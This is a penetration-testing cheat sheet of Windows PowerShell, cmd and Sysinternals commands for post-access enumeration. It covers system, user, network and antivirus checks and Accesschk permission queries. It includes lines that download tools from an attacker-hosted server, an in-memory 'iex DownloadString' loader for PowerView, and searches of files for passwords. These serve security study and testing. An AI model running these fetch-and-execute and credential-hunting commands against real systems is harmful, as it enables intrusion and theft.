# Useful commands with Powershell, cmd and Sysinternals

## Powershell

### Downloading files

- `certutil.exe -urlcache -f http://IP-OF-YOUR-WEBSERVER-WHERE-FILES-ARE-HOSTED/file-you-need name-you-want-to-give-the-file` (works also in cmd)
  ```
  PS C:\Users\users\Desktop> certutil.exe -urlcache -f http://192.168.3.28/powerview.ps1 powerview.ps1
  ****  Online  ****
  CertUtil: -URLCache command completed successfully.
  ```
- `wget http://IP-OF-YOUR-WEBSERVER-WHERE-FILES-ARE-HOSTED/file-you-need -OutFile name-you-want-to-give-the-file`
  ```
  PS C:\Users\user\Desktop> wget http://192.168.3.28/powerview.ps1 -OutFile powerview.ps1
  ```
- `iex (New-Object Net.WebClient).DownloadString('http://IP-OF-YOUR-WEBSERVER-WHERE-FILES-ARE-HOSTED/file-you-need')` will load it in memory without writing it in the disk, we will the be able to run powerview command if we use it to load powerview for instance
  ```
  PS C:\Users\s.chisholm.mayorsec\Desktop> iex (New-Object Net.WebClient).DownloadString('http://192.168.3.28/powerview.ps1')
  ```

### Powershell Remoting

- `Enter-PSSession -ComputerName workstation-01`
- `Enter-PSSession -ComputerName workstation-01 -Credential domain\Username`
- ` Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName workstation-01 -Credential domain\Username` connect to a remote powershell and excute command with ScriptBlock. other command we could do with scriptblock: `ipconfig`, `net user`,...
- `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections` List AppLocker rules

### Misc

- `Install-Module ActiveDirectoryModule -ScopeCurrentUser` Install a module without admin rights
- `Get-MpComputerStatus` Check Windows Defender Status
- `Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone` Test AppLocker policy
- `Get-HotFix | ft -AutoSize` display hotfixes
- `Get-WmiObject -Class Win32_Product |  select Name, Version` display installed software
- `gci (Get-ChildItem)` list named pipes

## CMD

### Downloading files

- `certutil.exe -urlcache -f http://IP-OF-YOUR-WEBSERVER-WHERE-FILES-ARE-HOSTED/file-you-need name-you-want-to-give-the-file`
- `curl.exe -o name-you-want-to-give-the-file http://IP-OF-YOUR-WEBSERVER-WHERE-FILES-ARE-HOSTED/file-you-need`

### System Enumeration

- If we want to grep on specific information we can use `findstr`  
  `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`  
  ```
  c:\>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" 
  systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
  OS Name:                   Microsoft Windows 7 Enterprise 
  OS Version:                6.1.7600 N/A Build 7600
  System Type:               X86-based PC
  ```
  
- If we want to see patches and update `wmic qfe`
  - `wmic qfe get Caption,Description,HotFixID,InstalledOn`
- List the drives `wmic logicaldisk` `list drives`
- `schtasks` query scheduled task
  - `schtasks /query /fo LIST /v`
- `driverquery` will list installed drivers
- `tasklist /svc` get the list of running processes
- `set` display all environment variables
- `wmic product get name` display installed software
- `icacls c:\Windows\System32\config\SAM` check permissions on the SAM file

### User Enumeration

- `whoami`will give info on the current user
- `whoami /priv` will give info on the current user and their priv
- `whoami /groups` will give info on groups the current user is in
- `net user` or `net users` will list the user on the machine
- `query user` logged in users
- `echo %USERNAME%` current user
- `net user username` will list info about the with the username mentionned
- `net localgroup` `net localgroup groupname` will give info on group
- `qwinsta` or  `query session` other users logged in simultaneously
- `net accounts` Get Password Policy & Other Account Information

### Network Enumeration

- `ipconfig` or `ipconfig /all`
- `arp -a`
- `route print`
- `netstat -ano` list active connections
  - `-a`: Displays all active connections and listening ports on the target system.
  - `-n`: Prevents name resolution. IP Addresses and ports are displayed with numbers instead of attempting to resolves names using DNS.
  - `-o`: Displays the process ID using each listed connection.
  - Any port listed as “LISTENING” that was not discovered with the external port scan can present a potential local service. This is when we might need to use port forwarding to investigate the service.
- Check what service runs on a specific port (in the example we will use 8080
  - `netstat -ano | findstr 8080`  
  ![image](https://user-images.githubusercontent.com/96747355/163686732-6f1b095a-70f0-4a04-a3a5-cc64a988b1e1.png)  
  - From this output we can take the pid and checkout which service it is using tasklist `tasklist | findstr 2164`  
  ![image](https://user-images.githubusercontent.com/96747355/163686766-1aa8da58-8584-4902-9dda-188fba31021f.png)  

### Hunting passwords

- `findstr /si password *.txt` will search for the string "password" in txt files `/si` means it searches in the current directory and all subdirectories (s) and ignore the case (i).
- `findstr /si password *.txt *.ini *.config *.sql` same but also in ini, sql and config files

### AV Enumeration

- `sc query windefend` will show if Defender is running
- `sc queryex type= service` will list all running service
- `netsh advfirewall firewall dump` check for firewall
- `netsh firewall show state` similar older command
- `netsh firewall show config` will show the config of the firewall, useful to see blocked ports and other

## Sysinternals

### Pipelist

[Pipelist](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist) is useful to enumerate instances of pipes  
- `pipelist.exe /accepteula` enumerate instances of named pipes.

### Accesschk

[Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) is useful to enumerate permissions  
- `accesschk.exe /accepteula`
- `accesschk.exe -wuvc Everyone *` list service we can write and to which everyone has access
- `.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"` List of user groups with read and write privs

## Resources

{% embed url="https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/07-working-with-wmi?view=powershell-7.1" %} Working with wmic {% endembed %}  
